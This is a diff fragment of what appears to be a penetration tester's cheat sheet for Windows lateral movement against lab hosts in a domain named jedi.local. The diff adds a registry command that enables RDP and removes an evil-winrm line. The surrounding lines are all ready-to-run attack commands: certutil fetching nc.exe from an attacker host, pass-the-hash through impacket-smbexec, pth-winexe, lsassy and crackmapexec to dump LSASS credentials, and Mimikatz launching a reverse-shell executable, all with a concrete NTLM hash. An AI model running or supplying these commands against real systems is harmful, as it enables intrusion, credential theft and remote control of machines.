@@ -100,6 +100,8 @@ net use * /delete /yes
 ===RDP
 rdesktop -r disk:tmp=/home/kali/share -u luke -p Passw0rd -k fr 192.168.66.42
 xfreerdp /u:luke /p:Passw0rd /cert:ignore /v:192.168.66.42 /drive:/home/kali/share,share
+=enable
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ===HTTP
 certutil.exe -urlcache -split -f http://192.168.66.66/nc.exe c:\windows\temp\nc.exe
 
@@ -114,7 +116,6 @@ impacket-smbexec jedi.local/luke@192.168.66.42 -hashes :b4b9b02e6f09a9bd760f388b
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bd760f388b67351e2b' //192.168.66.42 cmd.exe
 lsassy 192.168.66.42 -d . -u Administrator -H b4b9b02e6f09a9bd760f388b67351e2b 
 crackmapexec smb 192.168.66.42 -d . -u Administrator -H b4b9b02e6f09a9bd760f388b67351e2b -M lsassy
-ruby evil-winrm.rb -i 192.168.66.42 -u admin -H b4b9b02e6f09a9bd760f388b67351e2b 
 ===Local pass the hash (MIMIKATZ)
 sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
 sekurlsa::pth /user:luke /domain:jedi.local /ntlm:b4b9b02e6f09a9bd760f388b67351e2b /run:c:\Users\Administrator\Desktop\revshell64.exe
